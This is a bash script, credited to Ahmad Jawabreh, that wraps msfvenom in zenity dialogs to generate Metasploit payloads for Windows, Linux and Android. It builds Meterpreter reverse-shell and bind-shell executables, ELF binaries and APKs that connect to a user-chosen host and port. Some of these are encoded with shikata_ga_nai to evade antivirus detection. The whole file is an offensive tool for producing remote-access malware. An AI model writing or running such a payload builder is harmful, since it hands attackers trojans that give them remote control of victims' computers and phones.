#!/bin/bash
# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White
lanip=`hostname -I`
echo -e "$Cyan"

# This is the professional script for makeing payloads for all os 

        echo "╔──────────────────────────────────────────────╗"
        echo "|             Make msfvenom payloads            |"
        echo "|                By Ahmad Jawabreh             |"
        echo "┖──────────────────────────────────────────────┙"
        echo "[1] windows 32bit                               "
        echo "[2] windows 64bit                               "
        echo "[3] linux   32bit                               "
        echo "[4] linux   64bit                               "
        echo "[5] apk                                         "
sleep 3
echo -e "$Green"
File=$(zenity --title="☢ Whats your choice ☢" --text "" --entry-text "$file" --entry --width 300 2> /dev/null)
Port=$(zenity --title="☢ Port number ☢" --text "" --entry-text "443" --entry --width 300 2> /dev/null)
Host=$(zenity --title="☢ Host name ☢" --text "" --entry-text "$lanip" --entry --width 300 2> /dev/null)
Name=$(zenity --title="☢ File name ☢" --text "" --entry-text "name" --entry --width 300 2> /dev/null)

if [ $File -eq 1 ]
then
echo -e "$Blue "
PAYLOAD=$(zenity --list --title "☢ Payload Name ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/bind_tcp" --width 400 --height 400 2> /dev/null)
msfvenom  -a x86 -p $PAYLOAD --platform windows LPORT=$Port LHOST=$Host -e x86/shikata_ga_nai -i 3 -f exe -o /root/Desktop/$Name.exe    
sleep 2
echo -e "$Cyan File is Done"
fi


if [ $File -eq 2 ]
then
echo -e "$Blue "
PAYLOAD=$(zenity --list --title "☢ Payload Name ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/bind_tcp" --width 400 --height 400 2> /dev/null)
msfvenom -p $PAYLOAD LPORT=$Port LHOST=$Host -f exe -i 3 -o /root/Desktop/$Name.exe
sleep 2
echo -e "$Cyan File is Done"
fi


if [ $File -eq 3 ]
then
echo -e "$Blue "
PAYLOAD=$(zenity --list --title "☢ Payload Name ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x86/meterpreter/bind_tcp" FALSE "linux/x86/meterpreter_reverse_http " --width 400 --height 400 2> /dev/null)
msfvenom  -p $PAYLOAD --platform linux LPORT=$Port LHOST=$Host  -i 3 -f elf -o /root/Desktop/$Name.elf    
sleep 2
echo -e "$Cyan File is Done"
fi

if [ $File -eq 4 ]
then
echo -e "$Blue "
PAYLOAD=$(zenity --list --title "☢ Payload Name ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" FALSE "linux/x64/shell_bind_tcp " TRUE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/meterpreter_reverse_http" --width 400 --height 400 2> /dev/null)
msfvenom  -p $PAYLOAD --platform linux LPORT=$Port LHOST=$Host  -i 3 -f elf -o /root/Desktop/$Name.elf    
sleep 2
echo -e "$Cyan File is Done"
fi

if [ $File -eq 5 ]
then
echo -e "$Blue "
PAYLOAD=$(zenity --list --title "☢ Payload Name ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)
msfvenom  -p $PAYLOAD --platform android LPORT=$Port LHOST=$Host  -i 3 -o /root/Desktop/$Name.apk    
sleep 2
echo -e "$Cyan File is Done"
fi

if [ $? -eq 0 -a 1 ]
then
echo -e "$Red" 
        echo "╔──────────────────────────────────────────────╗"
        echo "|                 End Of Script                |"
        echo "|            Done By Ahmad Jawabreh            |"
        echo "┖──────────────────────────────────────────────┙"
        echo -e "$Cyan Good Bye"
fi
exit
